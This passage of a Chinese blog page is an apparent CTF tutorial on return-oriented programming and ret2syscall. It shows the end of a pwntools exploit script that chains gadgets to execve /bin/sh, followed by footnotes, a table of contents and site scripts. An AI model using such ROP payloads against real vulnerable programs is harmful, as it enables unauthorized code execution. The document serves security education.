class="number">0x80be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>成功pwn！</p>
+<p><img src="/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/image-20250827163439407.png" alt="image-20250827163439407"></p>
+<h2 id="参考">参考</h2>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p><a href="https://x2nn.github.io/2025/08/17/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E5%92%8C%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">https://x2nn.github.io/2025/08/17/C语言函数调用栈和栈溢出漏洞/</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn2" class="footnote-item"><p>【XMCVE 2020 CTF Pwn入门课程】<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1854y1y7Ro?p=3&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a">https://www.bilibili.com/video/BV1854y1y7Ro?p=3&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/08/17/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88%E5%92%8C%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-08-27 16:35:50
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
+                        #栈溢出
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/ROP/" title="ROP">
+                        #ROP
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="二进制安全">
+                        <b>#</b> 二进制安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-text">防止栈溢出的保护措施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-NX-bits"><span class="toc-text">The NX bits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ASLR"><span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIE"><span class="toc-text">PIE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary"><span class="toc-text">Canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RELRO"><span class="toc-text">RELRO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP%EF%BC%88Return-Oriented-Programming%EF%BC%89"><span class="toc-text">ROP（Return Oriented Programming）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%E7%9A%84%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3"><span class="toc-text">ROP的核心思想</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-text">系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%E6%95%B4%E4%B8%AA%E8%BF%87%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-text">ROP整个过程的分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP%E5%8E%9F%E7%90%86%E5%9B%BE"><span class="toc-text">ROP原理图[2]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%A0%88%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="toc-text">1、栈溢出覆盖返回地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E6%8C%87%E5%90%91%E7%AC%AC%E4%B8%80%E4%B8%AAgadget"><span class="toc-text">2、返回地址指向第一个gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%BD%86%E4%BC%9A%E5%9C%B0%E5%9D%80%E6%8C%87%E5%90%91%E7%AC%AC%E4%BA%8C%E4%B8%AAgadget"><span class="toc-text">3、但会地址指向第二个gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E7%BB%93%E6%9D%9FROP"><span class="toc-text">4、结束ROP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-text">ROP流程图</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall%E6%A1%88%E4%BE%8B"><span class="toc-text">ret2syscall案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">查看文件的安全防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96"><span class="toc-text">对返回地址进行覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0gadgets"><span class="toc-text">构造gadgets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC1%E4%B8%AAgadget"><span class="toc-text">第1个gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC2%E4%B8%AAgadget"><span class="toc-text">第2个gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC3%E4%B8%AAgadget"><span class="toc-text">第3个gadget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%88%A9%E7%94%A8"><span class="toc-text">总结利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%ACexp-py"><span class="toc-text">编写脚本exp.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2025 X2n.</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0 + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2025%2F08%2F19%2F%25E4%25BA%258C%25E8%25BF%259B%25E5%2588%25B6%25E4%25B9%258BROP%25E6%258A%2580%25E5%25B7%25A7%25E5%25AD%25A6%25E4%25B9%25A0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2025/08/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B9%8BROP%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
